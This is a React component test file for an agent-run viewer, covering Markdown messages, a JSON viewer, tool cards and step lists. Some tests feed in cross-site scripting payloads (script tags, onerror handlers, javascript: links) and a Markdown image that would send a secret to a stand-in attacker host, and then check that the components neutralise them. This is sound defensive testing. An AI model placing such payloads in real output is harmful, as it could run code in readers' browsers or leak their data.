import { fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

import { JsonView } from "@/components/json-view";

import docsRun from "../fixtures/docs-run.json";
import { buildTimeline, type ToolTurn } from "../timeline";
import type { RunEvent } from "../types";
import { AgentMessage } from "./agent-message";
import { StepList } from "./step-view";
import { ToolCard } from "./tool-card";

const NOW = Date.parse("2026-10-22T12:00:00Z");

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("AgentMessage", () => {
  it("renders Markdown", () => {
    render(<AgentMessage text={"# Title\n\nSome **bold** text.\n\n- one\n- two"} />);
    expect(screen.getByRole("heading", { name: "Title" })).toBeTruthy();
    expect(screen.getByText("bold").tagName).toBe("STRONG");
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
  });

  it("shows raw HTML as text and never renders it", () => {
    const { container } = render(
      <AgentMessage text={'Hi <script>alert(1)</script> <img src=x onerror="alert(2)"> there'} />,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
  });

  it("drops Markdown images, so no remote URL is fetched", () => {
    const { container } = render(<AgentMessage text="![x](https://evil.example/?q=secret)" />);
    expect(container.querySelector("img")).toBeNull();
  });

  it("opens links in a new tab and drops javascript: URLs", () => {
    render(<AgentMessage text="[docs](https://example.com) and [bad](javascript:alert(1))" />);
    const docs = screen.getByRole("link", { name: "docs" });
    expect(docs.getAttribute("target")).toBe("_blank");
    expect(docs.getAttribute("rel")).toBe("noreferrer");
    expect(screen.getByText("bad").getAttribute("href") ?? "").not.toContain("javascript");
  });

  it("shows a caret only while streaming", () => {
    const { rerender } = render(<AgentMessage text="Hello" streaming />);
    expect(screen.getByTestId("agent-message").dataset.streaming).toBe("true");
    rerender(<AgentMessage text="Hello" />);
    expect(screen.getByTestId("agent-message").dataset.streaming).toBeUndefined();
  });
});

describe("JsonView", () => {
  it("opens the first two levels and collapses deeper ones", () => {
    const { container } = render(<JsonView value={{ a: { b: { c: 1 } } }} />);
    const levels = container.querySelectorAll("details");
    expect([...levels].map((d) => d.open)).toEqual([true, true, false]);
  });

  it("copies the pretty-printed JSON", async () => {
    const writeText = vi.fn(() => Promise.resolve());
    vi.stubGlobal("navigator", { clipboard: { writeText } });
    render(<JsonView value={{ path: "src" }} label="arguments" />);
    fireEvent.click(screen.getByRole("button", { name: "Copy arguments" }));
    await waitFor(() => expect(writeText).toHaveBeenCalledWith('{\n  "path": "src"\n}'));
  });
});

describe("ToolCard", () => {
  const turn: ToolTurn = {
    kind: "tool",
    key: 1,
    callId: "c1",
    name: "repo.list_files",
    arguments: { path: "src" },
    output: '{"files": ["a.ts"]}',
    status: "completed",
    startedAt: "2026-10-22T12:00:00Z",
    endedAt: "2026-10-22T12:00:02Z",
  };

  it("is collapsed until opened, then shows the arguments and the result", () => {
    render(<ToolCard turn={turn} />);
    const trigger = screen.getByRole("button", { name: /repo\.list_files/ });
    expect(trigger.getAttribute("aria-expanded")).toBe("false");
    expect(screen.queryByText("Arguments")).toBeNull();
    fireEvent.click(trigger);
    expect(trigger.getAttribute("aria-expanded")).toBe("true");
    expect(screen.getByRole("group", { name: "repo.list_files arguments" })).toBeTruthy();
    expect(screen.getByRole("group", { name: "repo.list_files result" }).textContent).toContain(
      '"a.ts"',
    );
  });

  it("shows plain-text output as text, and an error result as failed", () => {
    render(<ToolCard turn={{ ...turn, output: "no such file", status: "failed" }} />);
    expect(screen.getByTestId("tool-card").dataset.status).toBe("failed");
    fireEvent.click(screen.getByRole("button", { name: /repo\.list_files/ }));
    expect(screen.getByLabelText("repo.list_files result").textContent).toBe("no such file");
  });
});

describe("StepList on the recorded docs run", () => {
  const timeline = buildTimeline(docsRun as RunEvent[]);

  it("shows one message block per agent turn, nested under the map items", () => {
    render(<StepList steps={timeline.steps} options={{ now: NOW }} />);
    const items = screen.getAllByTestId("map-item");
    expect(items.map((i) => i.querySelector("h4")?.textContent)).toEqual([
      "packages/api",
      "packages/engine",
      "web",
    ]);
    const first = within(items[0]!);
    expect(first.getAllByTestId("agent-message")).toHaveLength(2);
    expect(first.getAllByTestId("tool-card")).toHaveLength(1);
    // 3 writers × 2 turns + 2 review turns.
    expect(screen.getAllByTestId("agent-message")).toHaveLength(8);
    // The page's Markdown heading renders inside the second message.
    const page = within(first.getAllByTestId("agent-message")[1]!);
    expect(page.getByRole("heading", { name: "packages/api" })).toBeTruthy();
  });

  it("shows loop iterations, usage and the gate decision", () => {
    render(<StepList steps={timeline.steps} options={{ now: NOW }} />);
    expect(screen.getAllByTestId("iteration").map((i) => i.firstChild?.textContent)).toEqual([
      "Iteration 1· condition not met",
      "Iteration 2· condition met",
    ]);
    expect(screen.getAllByTestId("usage")[0]?.textContent).toBe("1,200 in · 180 out tokens");
    expect(screen.getByText("Open the docs PR?").parentElement?.textContent).toContain("Approved");
  });

  it("renders extra content for a step", () => {
    render(
      <StepList
        steps={timeline.steps}
        options={{ now: NOW, extra: (s) => (s.id === "approve" ? <p>gate panel</p> : null) }}
      />,
    );
    const gate = screen.getAllByTestId("step").find((s) => s.dataset.nodeId === "approve")!;
    expect(within(gate).getByText("gate panel")).toBeTruthy();
  });
});
